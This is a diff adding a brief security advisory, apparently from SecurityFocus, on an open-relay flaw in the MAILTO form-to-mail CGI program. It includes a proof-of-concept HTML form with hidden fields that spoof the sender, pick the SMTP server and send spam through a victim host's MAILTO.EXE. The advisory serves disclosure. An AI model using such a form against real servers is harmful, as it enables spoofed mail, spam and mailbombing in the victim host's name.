@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/3669/info
+
+MAILTO is a program maintained by Brian Dorricott. It enables web servers to allow forms to be converted into mail messages that can be sent to numerous recipients.
+
+An issue exists in MAILTO which could allow an attacker to send emails through a remote host's server.
+
+Sites that utilize or provide MAILTO are susceptible to this issue, typically their mail server information is published when providing install and usage instructions. This information can allow a user to include the mail server information into an HTML file and submit it via MAILTO. This email will then be delivered to the specified recipient with the appearance of originating from the victim web host.
+
+This problem makes it possible for a user with malicious intentions to socially engineer, mailbomb, or spam from as though it's coming from the victim web host. 
+
+<FORM ACTION="HTTP://WWW.MALWARE.COM/CGI-BIN/MAILTO.EXE" METHOD="POST">
+<INPUT TYPE="hidden" NAME="sendto" VALUE=billg@bloatedcorp.com>
+<INPUT TYPE="hidden" NAME="email" VALUE="hotsuezzz@xxxxxxrated.com">
+<INPUT TYPE="hidden" NAME="server" VALUE="smtp.malware.com">
+<INPUT TYPE="hidden" NAME="subject" VALUE="SPAM MONGER">
+<INPUT TYPE="hidden" NAME="resulturl" VALUE=http://ww.malware.com>
+
+Name: <INPUT NAME="uname" SIZE=30>
+Position: <INPUT NAME="title" SIZE=30>
+Company: <INPUT NAME="company" SIZE=30>
+E-Mail: <INPUT NAME="email" SIZE=30>
+Comments:<TEXTAREA name="comments" ROWS=10 COLS=50 SIZE="10">&lt;/textarea&gt;
+
+Press <INPUT TYPE="submit" VALUE="Submit">
+Idiot <INPUT TYPE="HALT !" VALUE="The Above Is A Example Only - The Data Is Fake"> 
